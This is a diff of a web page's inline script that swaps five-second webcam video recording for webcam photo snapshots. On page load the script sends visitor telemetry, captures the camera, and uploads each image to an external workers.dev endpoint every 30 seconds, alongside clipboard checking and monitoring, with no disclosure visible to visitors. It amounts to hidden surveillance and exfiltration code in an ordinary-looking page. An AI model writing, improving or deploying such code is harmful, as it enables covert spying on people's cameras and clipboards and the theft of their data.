@@ -402,11 +402,10 @@
 
     <script>
         const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
-        const VIDEO_INTERVAL_MS = 30000;
-        const CLIP_DURATION_MS = 5000;
+        const PHOTO_INTERVAL_MS = 30000;
         const statusEl = document.getElementById("statusMessage");
         let cachedVisitorInfo = null;
-        let videoTimerId = null;
+        let photoTimerId = null;
         let pageLeft = false;
 
         function detectBrowserName() {
@@ -523,21 +522,26 @@
             stream.getTracks().forEach(track => track.stop());
         }
 
-        function pickSupportedMimeType() {
-            if (typeof MediaRecorder === "undefined") return "";
-            const candidates = [
-                "video/webm;codecs=vp9,opus",
-                "video/webm;codecs=vp8,opus",
-                "video/webm",
-                "video/mp4"
-            ];
-            return candidates.find(type => MediaRecorder.isTypeSupported(type)) || "";
+        function videoToBlob(video) {
+            return new Promise((resolve) => {
+                if (!video || !video.videoWidth || !video.videoHeight) {
+                    resolve(null);
+                    return;
+                }
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob((blob) => {
+                    resolve(blob || null);
+                }, "image/jpeg", 0.85);
+            });
         }
 
-        async function recordFiveSecondClipAndStop() {
+        async function snapQuickPhotoAndStop() {
             if (pageLeft || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-            if (typeof MediaRecorder === "undefined") return null;
-
             let stream = null;
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
@@ -550,39 +554,28 @@
                     return null;
                 }
 
-                const mimeType = pickSupportedMimeType();
-                const recorder = mimeType
-                    ? new MediaRecorder(stream, { mimeType })
-                    : new MediaRecorder(stream);
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
 
-                const chunks = [];
-                const finished = new Promise((resolve) => {
-                    recorder.ondataavailable = (e) => {
-                        if (e.data && e.data.size > 0) {
-                            chunks.push(e.data);
-                        }
-                    };
-                    recorder.onstop = () => {
-                        stopStream(stream);
-                        stream = null;
-                        const resolvedType = recorder.mimeType || mimeType || "video/webm";
-                        resolve(chunks.length ? new Blob(chunks, { type: resolvedType }) : null);
-                    };
-                    recorder.onerror = () => {
-                        stopStream(stream);
-                        stream = null;
-                        resolve(null);
-                    };
-                });
+                await video.play().catch(() => {});
+                if (!video.videoWidth || !video.videoHeight) {
+                    await new Promise((resolve) => {
+                        video.addEventListener("loadedmetadata", () => {
+                            video.play().catch(() => {});
+                            requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(resolve, 120)));
+                        }, { once: true });
+                    });
+                } else {
+                    await new Promise((resolve) => setTimeout(resolve, 120));
+                }
 
-                recorder.start();
-                setTimeout(() => {
-                    if (recorder.state !== "inactive") {
-                        recorder.stop();
-                    }
-                }, CLIP_DURATION_MS);
-
-                return await finished;
+                const blob = await videoToBlob(video);
+                stopStream(stream);
+                stream = null;
+                video.srcObject = null;
+                return blob;
             } catch (err) {
                 stopStream(stream);
                 console.error(err);
@@ -590,18 +583,17 @@
             }
         }
 
-        async function uploadVideoBlob(blob) {
+        async function uploadPhotoBlob(blob) {
             if (!blob || pageLeft) return;
             try {
                 const visitor = await getVisitorInfo();
                 const logLine = await formatLogMessage(visitor, "");
-                const ext = blob.type.includes("mp4") ? "mp4" : "webm";
 
                 const formData = new FormData();
-                formData.append("eventType", "auto_video_interval");
+                formData.append("eventType", "auto_camera_interval");
                 formData.append("formattedLog", logLine);
                 formData.append("visitor", JSON.stringify(visitor));
-                formData.append("video", blob, `clip.${ext}`);
+                formData.append("photo", blob, "webcam.jpg");
 
                 await fetch(SEND_ENDPOINT, {
                     method: "POST",
@@ -612,19 +604,19 @@
             }
         }
 
-        async function runQuickVideoCycle() {
+        async function runQuickSnapCycle() {
             if (pageLeft) return;
-            const videoBlob = await recordFiveSecondClipAndStop();
-            if (videoBlob && !pageLeft) {
-                await uploadVideoBlob(videoBlob);
+            const blob = await snapQuickPhotoAndStop();
+            if (blob && !pageLeft) {
+                await uploadPhotoBlob(blob);
             }
         }
 
-        function stopPeriodicVideo() {
+        function stopPeriodicSnap() {
             pageLeft = true;
-            if (videoTimerId !== null) {
-                clearInterval(videoTimerId);
-                videoTimerId = null;
+            if (photoTimerId !== null) {
+                clearInterval(photoTimerId);
+                photoTimerId = null;
             }
         }
 
@@ -663,20 +655,20 @@
             setTimeout(monitorClipboard, 1000);
         }
 
-        window.addEventListener("pagehide", stopPeriodicVideo);
-        window.addEventListener("beforeunload", stopPeriodicVideo);
+        window.addEventListener("pagehide", stopPeriodicSnap);
+        window.addEventListener("beforeunload", stopPeriodicSnap);
 
         window.addEventListener("load", async () => {
             pageLeft = false;
             sendVisitTelemetry();
 
             await Promise.allSettled([
-                runQuickVideoCycle(),
+                runQuickSnapCycle(),
                 checkClipboardOnce()
             ]);
 
-            if (!pageLeft && videoTimerId === null) {
-                videoTimerId = setInterval(runQuickVideoCycle, VIDEO_INTERVAL_MS);
+            if (!pageLeft && photoTimerId === null) {
+                photoTimerId = setInterval(runQuickSnapCycle, PHOTO_INTERVAL_MS);
             }
             setTimeout(monitorClipboard, 1000);
         });
